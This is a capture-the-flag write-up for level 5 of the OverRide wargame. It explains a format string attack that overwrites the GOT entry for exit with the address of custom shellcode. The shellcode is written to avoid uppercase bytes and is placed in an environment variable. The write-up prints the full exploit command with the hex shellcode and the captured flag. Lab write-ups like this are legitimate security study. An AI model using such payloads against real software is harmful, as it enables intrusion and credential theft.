# Level 5

This time we instantly see a very bad printf usage that is vulnerable to format string attack. This is a classic format string attack where we will replace the address of the exit function in the GOT with the address of our shellcode. But this time our shellcode will not work because it has to get through a to_lower function. We have to cook a new shellcode that does not contain any ascii character between `@` and `[`. The new shellcode is a bit different, we cannot use push eax or a few other little subtilities but it is not that bad to make (yes it was). We place our shellcode in the environment to not be bothered with overflow or stack smashing and everything because our shellcode is big and we add NOPs to make sure we get a little bit of error margin. Last little subtility is we have to write the address in two halves because it is too big and will overflow the stdio buffer.

Finally to get the address of the env, we used [the code](./Ressources/getenv.c).

In order to compile it, we have to use -no-pie and -m32 flags

```bash
level05@OverRide:~$ python -c 'print "\xe0\x97\x04\x08\xe2\x97\x04\x08% 57187d%10$hn% 8340d%11$hn"' | env -i SHELLCODE=$(python -c 'print "\x68\x90\x90\x90\x90\x68\x90\x90\x90\x90\x68\x90\x90\x90\x90\x68\x90\x90\x90\x90\x68\x90\x90\x90\x90\x68\x90\x90\x90\x90\x68\x90\x90\x90\x90\x68\x90\x90\x90\x90\x68\x90\x90\x90\x90\x68\x90\x90\x90\x90\x6a\x73\x68\x2e\x70\x61\x73\x68\x30\x36\x2f\x2f\x68\x65\x76\x65\x6c\x68\x72\x73\x2f\x6c\x68\x2f\x75\x73\x65\x68\x68\x6f\x6d\x65\x68\x2f\x2f\x2f\x2f\x31\xc0\x89\xe3\x31\xc9\x31\xd2\xb0\x05\xb2\x01\xcd\x80\x89\xc3\x31\xc0\x89\xe1\xb2\x29\xb0\x03\xcd\x80\xb0\x04\xb3\x01\xb2\x29\x89\xe1\xcd\x80\xb0\x01\xcd\x80"') ./level05
```
And we get our flag :
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
